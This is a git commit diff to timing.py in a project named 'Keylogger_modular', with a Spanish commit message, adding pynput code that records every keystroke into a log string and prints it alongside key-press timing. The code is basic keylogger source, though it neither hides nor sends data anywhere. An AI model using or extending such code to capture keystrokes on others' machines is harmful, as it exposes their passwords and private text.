3b5bcebdb0f987644234389b970f4c908cd88554
JulioEscalon <59298247+JulioEscalon@users.noreply.github.com>
2020-08-01 04:39:46 -0500

    Update timing.py
    Agregada la función recognize (antes llamada keylogger) y appendLog (antes append_to_log), estoy pensando en importar la función threading para hacer una validación del timer, y además hacer una verificación con peso (función weight)

--- Keylogger_modular/timing.py
+++ Keylogger_modular/timing.py
@@ -1,11 +1,26 @@
-import pynput.keyboard
+from pynput.keyboard import Listener
 from datetime import datetime,time
-import timeit
 
 class tiempos:
     count=0
+    log =""
+    
+    def appendLog(self,string):
+        self.log = self.log + string
+        print(self.log)
+        
+    def recognize(self, key):
+            try:
+                otrokey = str(key.char)
+            except AttributeError:
+                if key == key.space:
+                    otrokey = " "
+                else:
+                    otrokey= " " + str(key) + " " 
+            self.appendLog(otrokey)
 
     def pressKey(self, key):
+        self.recognize(key)
         if self.count==0:
             print("La tecla",key,"se presiono:",str(datetime.today()))
         self.count=self.count+1
@@ -15,6 +30,7 @@ class tiempos:
         self.count=0
    
     def start(self):
-        keyboard_listener = pynput.keyboard.Listener(self.pressKey, self.leaveKey)
+        keyboard_listener = Listener(self.pressKey, self.leaveKey)
         with keyboard_listener:
             keyboard_listener.join()
+
